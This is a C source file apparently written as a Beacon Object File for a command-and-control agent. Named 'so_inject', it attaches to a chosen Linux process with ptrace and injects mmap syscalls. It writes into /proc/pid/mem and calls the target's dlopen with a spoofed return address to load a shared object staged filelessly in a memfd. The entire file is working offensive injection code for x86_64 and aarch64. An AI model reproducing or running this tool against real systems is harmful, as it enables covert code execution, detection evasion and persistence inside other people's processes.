#include "bof_api.h"

#if defined(__x86_64__)
# define SYS_mmap          9
# define SYS_munmap        11
# define SYS_memfd_create  319
# define SYS_write         1
# define SYS_close         3
# define SYS_getpid        39
#elif defined(__aarch64__)
# define SYS_mmap          222
# define SYS_munmap        215
# define SYS_memfd_create  279
# define SYS_write         64
# define SYS_close         57
# define SYS_getpid        172
#endif

#ifndef PROT_READ
# define PROT_READ   1
# define PROT_WRITE  2
#endif
#ifndef MAP_PRIVATE
# define MAP_PRIVATE   0x02
# define MAP_ANONYMOUS 0x20
#endif
#ifndef RTLD_LAZY
# define RTLD_LAZY  1
# define RTLD_LOCAL 0
#endif
#ifndef MFD_CLOEXEC
# define MFD_CLOEXEC 1
#endif
#ifndef O_RDONLY
# define O_RDONLY 0
# define O_RDWR   2
#endif
#ifndef SEEK_SET
# define SEEK_SET 0
#endif

#define PTRACE_PEEKDATA  2
#define PTRACE_POKEDATA  5
#define PTRACE_GETREGS   12
#define PTRACE_SETREGS   13
#ifndef PTRACE_GETREGSET
# define PTRACE_GETREGSET 0x4204
# define PTRACE_SETREGSET 0x4205
#endif
#define PTRACE_ATTACH    16
#define PTRACE_DETACH    17
#define PTRACE_CONT      7
#define NT_PRSTATUS      1

/* libc dynamic resolution */
extern long   LIBC$ptrace(int req, int pid, void *addr, void *data);
extern int    LIBC$waitpid(int pid, int *status, int options);
extern int    LIBC$open(const char *path, int flags, int mode);
extern long   LIBC$read(int fd, void *buf, long count);
extern long   LIBC$write(int fd, const void *buf, long count);
extern long   LIBC$lseek(int fd, long offset, int whence);
extern int    LIBC$close(int fd);
extern int    LIBC$snprintf(char *buf, int sz, const char *fmt, ...);
extern void  *LIBC$malloc(unsigned long sz);
extern void   LIBC$free(void *p);
extern int   *LIBC$__errno_location(void);
extern char  *LIBC$strerror(int e);
extern long   LIBC$syscall(long nr, ...);

static int bof_errno(void){ return *LIBC$__errno_location(); }
static int bof_strlen(const char *s){ int n=0; while(s&&s[n]) n++; return n; }
static void bof_memset(void *s,int c,int n){
    unsigned char *p=s; while(n-->0)*p++=(unsigned char)c; }
static void bof_memcpy(void *d,const void *s,int n){
    unsigned char *dd=d; const unsigned char *ss=s; while(n-->0)*dd++=*ss++; }

/* register structures */
#if defined(__x86_64__)
typedef struct {
    unsigned long r15,r14,r13,r12,rbp,rbx;
    unsigned long r11,r10,r9,r8,rax,rcx;
    unsigned long rdx,rsi,rdi,orig_rax;
    unsigned long rip,cs,eflags,rsp,ss;
    unsigned long fs_base,gs_base,ds,es,fs,gs;
} user_regs_t;
#elif defined(__aarch64__)
typedef struct {
    unsigned long regs[31];
    unsigned long sp,pc,pstate;
} user_regs_t;
#endif

typedef struct { void *iov_base; unsigned long iov_len; } bof_iovec_t;

static int get_regs(int pid, user_regs_t *r){
#if defined(__x86_64__)
    return (int)LIBC$ptrace(PTRACE_GETREGS,pid,0,r);
#else
    bof_iovec_t iov={r,sizeof(*r)};
    return (int)LIBC$ptrace(PTRACE_GETREGSET,pid,(void*)(long)NT_PRSTATUS,&iov);
#endif
}
static int set_regs(int pid, user_regs_t *r){
#if defined(__x86_64__)
    return (int)LIBC$ptrace(PTRACE_SETREGS,pid,0,r);
#else
    bof_iovec_t iov={r,sizeof(*r)};
    return (int)LIBC$ptrace(PTRACE_SETREGSET,pid,(void*)(long)NT_PRSTATUS,&iov);
#endif
}

static long inject_syscall(int pid, user_regs_t *saved,
                            unsigned long nr,
                            unsigned long a0,unsigned long a1,
                            unsigned long a2,unsigned long a3,
                            unsigned long a4,unsigned long a5){
#if defined(__x86_64__)
    unsigned long rip=saved->rip;
    long orig=LIBC$ptrace(PTRACE_PEEKDATA,pid,(void*)rip,0);
    unsigned char p[8]; bof_memcpy(p,&orig,8);
    p[0]=0x0f; p[1]=0x05;
    long pw=0; bof_memcpy(&pw,p,8);
    LIBC$ptrace(PTRACE_POKEDATA,pid,(void*)rip,(void*)pw);
    user_regs_t r=*saved;
    r.rax=nr; r.rdi=a0; r.rsi=a1; r.rdx=a2;
    r.r10=a3; r.r8=a4; r.r9=a5;
    set_regs(pid,&r);
    int st=0;
    LIBC$ptrace(24,pid,0,0); LIBC$waitpid(pid,&st,0);
    LIBC$ptrace(24,pid,0,0); LIBC$waitpid(pid,&st,0);
    user_regs_t post; get_regs(pid,&post);
    long ret=(long)post.rax;
    LIBC$ptrace(PTRACE_POKEDATA,pid,(void*)rip,(void*)orig);
    set_regs(pid,saved);
    return ret;
#elif defined(__aarch64__)
    unsigned long pc=saved->pc;
    long orig=LIBC$ptrace(PTRACE_PEEKDATA,pid,(void*)pc,0);
    unsigned int svc=0xD4000001;
    long patched=(orig&~0xFFFFFFFFUL)|svc;
    LIBC$ptrace(PTRACE_POKEDATA,pid,(void*)pc,(void*)patched);
    user_regs_t r=*saved;
    r.regs[8]=nr; r.regs[0]=a0; r.regs[1]=a1; r.regs[2]=a2;
    r.regs[3]=a3; r.regs[4]=a4; r.regs[5]=a5;
    set_regs(pid,&r);
    int st=0;
    LIBC$ptrace(24,pid,0,0); LIBC$waitpid(pid,&st,0);
    LIBC$ptrace(24,pid,0,0); LIBC$waitpid(pid,&st,0);
    user_regs_t post; get_regs(pid,&post);
    long ret=(long)post.regs[0];
    LIBC$ptrace(PTRACE_POKEDATA,pid,(void*)pc,(void*)orig);
    set_regs(pid,saved);
    return ret;
#endif
}

static int write_to_process(int pid, unsigned long addr,
                             const unsigned char *data, int len){
    char path[64];
    LIBC$snprintf(path,sizeof(path),"/proc/%d/mem",pid);
    int fd=LIBC$open(path,O_RDWR,0);
    if(fd<0) return -1;
    LIBC$lseek(fd,(long)addr,SEEK_SET);
    long w=LIBC$write(fd,data,(long)len);
    LIBC$close(fd);
    return (w==len)?0:-1;
}

typedef unsigned long  Elf64_Addr;
typedef unsigned long  Elf64_Off;
typedef unsigned short Elf64_Half;
typedef unsigned int   Elf64_Word;
typedef unsigned long  Elf64_Xword;
typedef struct {
    unsigned char e_ident[16]; Elf64_Half e_type,e_machine;
    Elf64_Word e_version; Elf64_Addr e_entry; Elf64_Off e_phoff,e_shoff;
    Elf64_Word e_flags; Elf64_Half e_ehsize,e_phentsize,e_phnum;
    Elf64_Half e_shentsize,e_shnum,e_shstrndx;
} Elf64_Ehdr;
typedef struct {
    Elf64_Word sh_name,sh_type; Elf64_Xword sh_flags,sh_addr;
    Elf64_Off sh_offset; Elf64_Xword sh_size;
    Elf64_Word sh_link,sh_info; Elf64_Xword sh_addralign,sh_entsize;
} Elf64_Shdr;
typedef struct {
    Elf64_Word st_name; unsigned char st_info,st_other;
    Elf64_Half st_shndx; Elf64_Addr st_value; Elf64_Xword st_size;
} Elf64_Sym;
#define SHT_DYNSYM 11

static unsigned long elf_find_symbol(const char *path, const char *sym){
    int fd=LIBC$open(path,O_RDONLY,0); if(fd<0) return 0;
    Elf64_Ehdr eh; LIBC$read(fd,&eh,sizeof(eh));
    if(eh.e_ident[0]!=0x7f||eh.e_ident[1]!='E'){LIBC$close(fd);return 0;}
    unsigned long so=0,ss=0,sr=0; Elf64_Shdr sh;
    for(int i=0;i<eh.e_shnum;i++){
        LIBC$lseek(fd,(long)(eh.e_shoff+i*eh.e_shentsize),SEEK_SET);
        LIBC$read(fd,&sh,sizeof(sh));
        if(sh.sh_type==SHT_DYNSYM){
            so=sh.sh_offset; ss=sh.sh_size;
            Elf64_Shdr ss2;
            LIBC$lseek(fd,(long)(eh.e_shoff+sh.sh_link*eh.e_shentsize),SEEK_SET);
            LIBC$read(fd,&ss2,sizeof(ss2)); sr=ss2.sh_offset; break;
        }
    }
    if(!so){LIBC$close(fd);return 0;}
    unsigned long res=0,n=ss/sizeof(Elf64_Sym);
    for(unsigned long i=0;i<n;i++){
        Elf64_Sym s;
        LIBC$lseek(fd,(long)(so+i*sizeof(Elf64_Sym)),SEEK_SET);
        LIBC$read(fd,&s,sizeof(s));
        if(!s.st_name||!s.st_value) continue;
        char nm[64]; bof_memset(nm,0,64);
        LIBC$lseek(fd,(long)(sr+s.st_name),SEEK_SET); LIBC$read(fd,nm,63);
        int m=1; const char *a=nm,*b=sym;
        while(*a&&*b){if(*a!=*b){m=0;break;}a++;b++;}
        if(m&&!*a&&!*b){res=s.st_value;break;}
    }
    LIBC$close(fd); return res;
}

static int maps_line_parse(char *line, unsigned long *start,
                            char **path, int *out_exec){
    unsigned long s=0; char *p=line;
    while(*p&&*p!='-'){s=s*16+(*p<='9'?*p-'0':*p-('a'-10));p++;}
    if(*p=='-')p++;
    while(*p&&*p!=' ')p++;
    if(*p==' ')p++;
    int x=(p[2]=='x');
    int f=0; while(*p&&f<4){while(*p==' ')p++;while(*p&&*p!=' ')p++;f++;}
    while(*p==' ')p++;
    if(!*p) return 0;
    *start=s; *path=p; if(out_exec)*out_exec=x; return 1;
}

static int path_is_libc(char *p){
    char *fname=p,*q=p;
    while(*q){if(*q=='/') fname=q+1; q++;}
    if(fname[0]=='l'&&fname[1]=='i'&&fname[2]=='b'&&fname[3]=='c'&&
       (fname[4]=='.'||fname[4]=='-')) return 1;
    if(fname[0]=='l'&&fname[1]=='d'&&(fname[2]=='-'||fname[2]=='.')) return 1;
    return 0;
}

static unsigned long scan_maps(int pid, unsigned long *out_spoof){
    char mp[64]; LIBC$snprintf(mp,64,"/proc/%d/maps",pid);
    int fd=LIBC$open(mp,O_RDONLY,0);
    if(fd<0){
        BeaconPrintf(CALLBACK_ERROR,"so_inject: open maps failed: %s\n",
                     LIBC$strerror(bof_errno()));
        return 0;
    }
    char lb[512]; int lp=0; char rb[4096];
    unsigned long libc_base=0, libc_exec=0;
    char libc_path[256]; bof_memset(libc_path,0,sizeof(libc_path));

    while(1){
        int n=(int)LIBC$read(fd,rb,sizeof(rb)); if(n<=0) break;
        for(int i=0;i<n;i++){
            char c=rb[i];
            if(c=='\n'||lp==(int)sizeof(lb)-1){
                lb[lp]='\0'; lp=0;
                unsigned long start=0; char *path=0; int exec=0;
                if(maps_line_parse(lb,&start,&path,&exec)&&path_is_libc(path)){
                    if(!libc_base){
                        libc_base=start;
                        int pl=0;
                        while(path[pl]&&path[pl]!='\n'&&pl<(int)sizeof(libc_path)-1)
                            libc_path[pl]=path[pl],pl++;
                        libc_path[pl]='\0';
                    }
                    if(!libc_exec&&exec) libc_exec=start;
                }
            } else { lb[lp++]=c; }
        }
        if(libc_base&&libc_exec) break;
    }
    LIBC$close(fd);

    if(!libc_base){
        BeaconPrintf(CALLBACK_ERROR,"so_inject: no libc found in target maps\n");
        return 0;
    }

    unsigned long off=elf_find_symbol(libc_path,"__dlopen");
    if(!off) off=elf_find_symbol(libc_path,"dlopen");
    if(!off){
        BeaconPrintf(CALLBACK_ERROR,"so_inject: dlopen not found in %s\n",libc_path);
        return 0;
    }
    BeaconPrintf(CALLBACK_OUTPUT,"[*] dlopen at 0x%lx+0x%lx in %s\n",
                 libc_base,off,libc_path);
    if(out_spoof) *out_spoof=libc_exec?libc_exec:libc_base;
    return libc_base+off;
}

static long call_remote_func(int pid, user_regs_t *saved,
                              unsigned long func_addr,
                              unsigned long spoof_addr,
                              unsigned long a0, unsigned long a1){
#if defined(__x86_64__)
    long orig_spoof=LIBC$ptrace(PTRACE_PEEKDATA,pid,(void*)spoof_addr,0);
    unsigned char trap[8]; bof_memcpy(trap,&orig_spoof,8);
    trap[0]=0xCC;
    long trap_word=0; bof_memcpy(&trap_word,trap,8);
    LIBC$ptrace(PTRACE_POKEDATA,pid,(void*)spoof_addr,(void*)trap_word);

    user_regs_t r=*saved;
    r.rsp&=~0xfUL;
    r.rsp-=8;
    LIBC$ptrace(PTRACE_POKEDATA,pid,(void*)r.rsp,(void*)spoof_addr);
    r.rip=func_addr;
    r.rdi=a0; r.rsi=a1;
    r.rax=0; r.orig_rax=0;
    set_regs(pid,&r);

    long retval=-1; int st=0;
    for(int i=0;i<4096;i++){
        LIBC$ptrace(PTRACE_CONT,pid,0,0);
        LIBC$waitpid(pid,&st,0);
        if(((st)&0xff)!=0x7f) break;
        int sig=((st)>>8)&0xff;
        if(sig==5){
            user_regs_t cur; get_regs(pid,&cur);
            if(cur.rip==spoof_addr+1||cur.rip==spoof_addr){
                retval=(long)cur.rax; break;
            }
        }
        if(sig!=17&&sig!=19)
            LIBC$ptrace(PTRACE_CONT,pid,0,(void*)(long)sig);
    }
    LIBC$ptrace(PTRACE_POKEDATA,pid,(void*)spoof_addr,(void*)orig_spoof);
    set_regs(pid,saved);
    return retval;

#elif defined(__aarch64__)
    long orig_spoof=LIBC$ptrace(PTRACE_PEEKDATA,pid,(void*)spoof_addr,0);
    unsigned int brk0=0xD4200000;
    long trap_word=(orig_spoof&~0xFFFFFFFFUL)|brk0;
    LIBC$ptrace(PTRACE_POKEDATA,pid,(void*)spoof_addr,(void*)trap_word);

    user_regs_t r=*saved;
    r.sp&=~0xfUL;
    r.pc=func_addr;
    r.regs[30]=spoof_addr;
    r.regs[0]=a0; r.regs[1]=a1;
    set_regs(pid,&r);

    long retval=-1; int st=0;
    for(int i=0;i<4096;i++){
        LIBC$ptrace(PTRACE_CONT,pid,0,0);
        LIBC$waitpid(pid,&st,0);
        if(((st)&0xff)!=0x7f) break;
        int sig=((st)>>8)&0xff;
        if(sig==5){
            user_regs_t cur; get_regs(pid,&cur);
            if(cur.pc==spoof_addr){ retval=(long)cur.regs[0]; break; }
        }
        if(sig!=17&&sig!=19)
            LIBC$ptrace(PTRACE_CONT,pid,0,(void*)(long)sig);
    }
    LIBC$ptrace(PTRACE_POKEDATA,pid,(void*)spoof_addr,(void*)orig_spoof);
    set_regs(pid,saved);
    return retval;
#endif
}

void go(char *args, int args_len){
    datap parser;
    BeaconDataParse(&parser,args,args_len);

    int pid=BeaconDataInt(&parser);
    if(pid<=0){BeaconPrintf(CALLBACK_ERROR,"so_inject: invalid PID\n");return;}

    int name_len=0;
    char *memfd_name=BeaconDataExtract(&parser,&name_len);
    if(!memfd_name||name_len<=0){
        BeaconPrintf(CALLBACK_ERROR,"so_inject: missing memfd name\n"); return;
    }

    int so_len=0;
    unsigned char *so_data=(unsigned char*)BeaconDataExtract(&parser,&so_len);
    if(!so_data||so_len<=0){
        BeaconPrintf(CALLBACK_ERROR,"so_inject: missing .so data\n"); return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] so_inject: pid=%d memfd=[%s] so_size=%d bytes\n",
        pid,memfd_name,so_len);

    long mfd=(long)LIBC$syscall(SYS_memfd_create,
                                 (unsigned long)memfd_name,
                                 (unsigned long)MFD_CLOEXEC);
    if(mfd<0){
        BeaconPrintf(CALLBACK_ERROR,"so_inject: memfd_create failed: %s\n",
                     LIBC$strerror(bof_errno()));
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT,"[*] memfd fd=%ld\n",mfd);

    long written=0;
    while(written<so_len){
        long w=LIBC$write((int)mfd,so_data+written,so_len-written);
        if(w<=0){
            BeaconPrintf(CALLBACK_ERROR,"so_inject: write to memfd failed\n");
            LIBC$close((int)mfd); return;
        }
        written+=w;
    }
    BeaconPrintf(CALLBACK_OUTPUT,"[*] wrote %ld bytes to memfd\n",written);

    long agent_pid=(long)LIBC$syscall(SYS_getpid);
    char so_path[128];
    LIBC$snprintf(so_path,sizeof(so_path),"/proc/%ld/fd/%ld",agent_pid,mfd);
    BeaconPrintf(CALLBACK_OUTPUT,"[*] dlopen path: %s\n",so_path);

    if(LIBC$ptrace(PTRACE_ATTACH,pid,0,0)<0){
        BeaconPrintf(CALLBACK_ERROR,"so_inject: ptrace attach failed: %s\n",
                     LIBC$strerror(bof_errno()));
        LIBC$close((int)mfd); return;
    }
    int st=0; LIBC$waitpid(pid,&st,0);
    BeaconPrintf(CALLBACK_OUTPUT,"[*] attached to pid=%d\n",pid);

    user_regs_t saved; bof_memset(&saved,0,sizeof(saved));
    if(get_regs(pid,&saved)<0){
        BeaconPrintf(CALLBACK_ERROR,"so_inject: GETREGS failed\n");
        LIBC$ptrace(PTRACE_DETACH,pid,0,0);
        LIBC$close((int)mfd); return;
    }

    unsigned long spoof_addr=0;
    unsigned long remote_dlopen=scan_maps(pid,&spoof_addr);
    if(!remote_dlopen){
        LIBC$ptrace(PTRACE_DETACH,pid,0,0);
        LIBC$close((int)mfd); return;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] remote dlopen=0x%lx spoof=0x%lx\n",remote_dlopen,spoof_addr);

    int path_len=bof_strlen(so_path)+1;
    long staging=inject_syscall(pid,&saved,SYS_mmap,
                                0,(unsigned long)path_len,
                                PROT_READ|PROT_WRITE,
                                MAP_PRIVATE|MAP_ANONYMOUS,
                                (unsigned long)-1,0);
    if(staging<=0||(unsigned long)staging>(unsigned long)-4096UL){
        BeaconPrintf(CALLBACK_ERROR,"so_inject: staging mmap failed\n");
        LIBC$ptrace(PTRACE_DETACH,pid,0,0);
        LIBC$close((int)mfd); return;
    }

    if(write_to_process(pid,(unsigned long)staging,
                        (const unsigned char*)so_path,path_len)<0){
        BeaconPrintf(CALLBACK_ERROR,"so_inject: write path failed\n");
        inject_syscall(pid,&saved,SYS_munmap,
                       (unsigned long)staging,(unsigned long)path_len,0,0,0,0);
        LIBC$ptrace(PTRACE_DETACH,pid,0,0);
        LIBC$close((int)mfd); return;
    }
    BeaconPrintf(CALLBACK_OUTPUT,"[*] path written to staging buffer\n");

    long handle=call_remote_func(pid,&saved,
                                  remote_dlopen,spoof_addr,
                                  (unsigned long)staging,
                                  (unsigned long)(RTLD_LAZY|RTLD_LOCAL));
    if(handle==0){
        BeaconPrintf(CALLBACK_ERROR,"so_inject: dlopen returned NULL\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] injected (handle=0x%lx)\n",(unsigned long)handle);
    }

    inject_syscall(pid,&saved,SYS_munmap,
                   (unsigned long)staging,(unsigned long)path_len,0,0,0,0);
    set_regs(pid,&saved);
    LIBC$ptrace(PTRACE_DETACH,pid,0,0);
    LIBC$close((int)mfd);

    BeaconPrintf(CALLBACK_OUTPUT,"[+] detached — pid=%d alive\n",pid);
}
